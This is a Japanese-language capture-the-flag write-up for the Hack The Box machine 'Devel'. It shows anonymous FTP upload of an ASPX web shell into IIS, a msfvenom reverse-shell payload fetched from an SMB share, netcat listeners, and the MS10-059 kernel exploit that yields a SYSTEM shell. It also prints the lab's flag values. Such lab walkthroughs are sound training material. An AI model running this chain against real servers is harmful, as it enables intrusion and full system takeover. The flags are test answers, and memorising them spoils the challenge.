https://app.hackthebox.com/machines/Devel

## STEP 1
tcp21番と80番がオープン  
またftpはanonymousログインが確認できた
```sh
└─$ rustscan -a 10.129.34.17 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.34.17:21
Open 10.129.34.17:80
10.129.34.17 -> [21,80]
```
```sh
└─$ nmap -n -Pn -p21 --script=ftp-anon 10.129.34.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-23 05:40 CDT
Nmap scan report for 10.129.34.17
Host is up (0.31s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png

Nmap done: 1 IP address (1 host up) scanned in 3.78 seconds
```


## STEP 2
80番にアクセスすると、iisだった  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Devel_01.png">  
nmapの結果から、ftpでリストされているフォルダはiisのフォルダだとわかる  
ftpでiis用のWebSehllをアップロードできそう  
`seclists`のwebshellをftpでiis上にアップロード
```sh
└─$ cp /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx webshell.aspx

└─$ curl -s -T webshell.aspx --user anonymous:anonymous ftp://10.129.26.196
```
webshellアップロード成功、コマンド実行も確認  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Devel_02.png">  
kaliでペイロードを作成し、smbサーバにアップロード
```sh
└─$ msfvenom -p windows/shell_reverse_tcp  LHOST=tun0 LPORT=4444 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: smb/shell.exe

└─$ impacket-smbserver share .                            
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
webshellからsmbサーバのペイロードを実行
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Devel_03.png">
リバースシェル取得！しかしュ＝ザフラグすら獲得できず
```sh
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.41] from (UNKNOWN) [10.129.26.196] 49198
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>cd C:\Users\babis
cd C:\Users\babis
Access is denied.
```


## STEP 3
hotfixを確認、どうやらパッチは当たってなさそう
```bat                                                                                                                                                                                                                               
c:\windows\system32\inetsrv> systeminfo
Host Name:                 DEVEL                                                                                                                                                                                                            
OS Name:                   Microsoft Windows 7 Enterprise                                                                                                                                                                                   
OS Version:                6.1.7600 N/A Build 7600                                                                                                                                                                                          
OS Manufacturer:           Microsoft Corporation                                                                                                                                                                                            
OS Configuration:          Standalone Workstation                                                                                                                                                                                           
OS Build Type:             Multiprocessor Free                                                                                                                                                                                              
Registered Owner:          babis                                                                                                                                                                                                            
Registered Organization:                                                                                                                                                                                                                    
Product ID:                55041-051-0948536-86302                                                                                                                                                                                          
Original Install Date:     17/3/2017, 4:17:31 ��                                                                                                                                                                                            
System Boot Time:          12/4/2025, 3:24:47 ��                                                                                                                                                                                            
System Manufacturer:       VMware, Inc.                                                                                                                                                                                                     
System Model:              VMware Virtual Platform                                                                                                                                                                                          
System Type:               X86-based PC                                                                                                                                                                                                     
Processor(s):              1 Processor(s) Installed.                                                                                                                                                                                        
                           [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz                                                                                                                                                    
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020                                                                                                                                                                        
Windows Directory:         C:\Windows                                                                                                                                                                                                       
System Directory:          C:\Windows\system32                                                                                                                                                                                              
Boot Device:               \Device\HarddiskVolume1                                                                                                                                                                                          
System Locale:             el;Greek                                                                                                                                                                                                         
Input Locale:              en-us;English (United States)                                                                                                                                                                                    
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul                                                                                                                                                                          
Total Physical Memory:     3.071 MB                                                                                                                                                                                                         
Available Physical Memory: 2.458 MB                                                                                                                                                                                                         
Virtual Memory: Max Size:  6.141 MB                                                                                                                                                                                                         
Virtual Memory: Available: 5.536 MB                                                                                                                                                                                                         
Virtual Memory: In Use:    605 MB                                                                                                                                                                                                           
Page File Location(s):     C:\pagefile.sys                                                                                                                                                                                                  
Domain:                    HTB                                                                                                                                                                                                              
Logon Server:              N/A                                                                                                                                                                                                              
Hotfix(s):                 N/A                                                                                                                                                                                                              
Network Card(s):           1 NIC(s) Installed.                                                                                                                                                                                              
                           [01]: Intel(R) PRO/1000 MT Network Connection                                                                                                                                                                    
                                 Connection Name: Local Area Connection 4                                                                                                                                                                   
                                 DHCP Enabled:    Yes                                                                                                                                                                                       
                                 DHCP Server:     10.129.0.1                                                                                                                                                                                
                                 IP address(es)                                                                                                                                                                                             
                                 [01]: 10.129.179.187                                                                                                                                                                                       
                                 [02]: fe80::25d2:ba5b:6742:76e5                                                                                                                                                                            
                                 [03]: dead:beef::a9b3:30cd:2ab2:ef15                                                                                                                                                                       
                                 [04]: dead:beef::25d2:ba5b:6742:76e5                                                                                                                                                                       
                                                                                                                                                                                                                                            
No Instance(s) Available.                                                                                                                                                                                                                                   
```
[windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)でカーネルエクスプロイトを探していく  
[MS10-59](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059)がささりそう  
PoCをダウンロードしftpでiis上に配送
```sh
└─$ wget -nv https://github.com/abatchy17/WindowsExploits/raw/refs/heads/master/MS10-059%20-%20Chimichurri/MS10-059.exe
2025-04-11 22:06:24 (28.8 MB/s) URL:https://raw.githubusercontent.com/abatchy17/WindowsExploits/refs/heads/master/MS10-059%20-%20Chimichurri/MS10-059.exe [784384/784384] -> "MS10-059.exe" [1]

└─$ curl -s -T MS10-059.exe --user anonymous:anonymous ftp://10.129.26.196 
```
PoC実行
```bat
C:\windows\system32\inetsrv> cd C:\inetpub\wwwroot

C:\inetpub\wwwroot>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\inetpub\wwwroot

13/08/2025  10:08 ��    <DIR>          .
13/08/2025  10:08 ��    <DIR>          ..
18/03/2017  02:06 ��    <DIR>          aspnet_client
17/03/2017  05:37 ��               689 iisstart.htm
13/08/2025  10:08 ��           784.384 MS10-059.exe
13/08/2025  10:05 ��             1.400 webshell.aspx
17/03/2017  05:37 ��           184.946 welcome.png
               4 File(s)        971.419 bytes
               3 Dir(s)   4.691.505.152 bytes free

C:\inetpub\wwwroot>MS10-059.exe                                                                                                                                                                                                             
MS10-059.exe                                                                                                                                                                                                                                
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR>                                                                                                                  

C:\inetpub\wwwroot>MS10-059.exe 10.10.16.4 5555                                                                                                                                                                                             
MS10-059.exe 10.10.16.4 5555                                                                                                                                                                                                                
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR> 
```
権限昇格成功！ユーザフラグ・ルートフラグゲット
```bat
└─$ rlwrap nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.26.196] 49180
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\wwwroot>whoami
whoami
nt authority\system

C:\inetpub\wwwroot>type C:\Users\babis\Desktop\user.txt
type C:\Users\babis\Desktop\user.txt
abef9fb26d5f6458b71e6a5ecd73044a

C:\inetpub\wwwroot>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
0a14779ea0fe50000e619fabfcb77be9
```
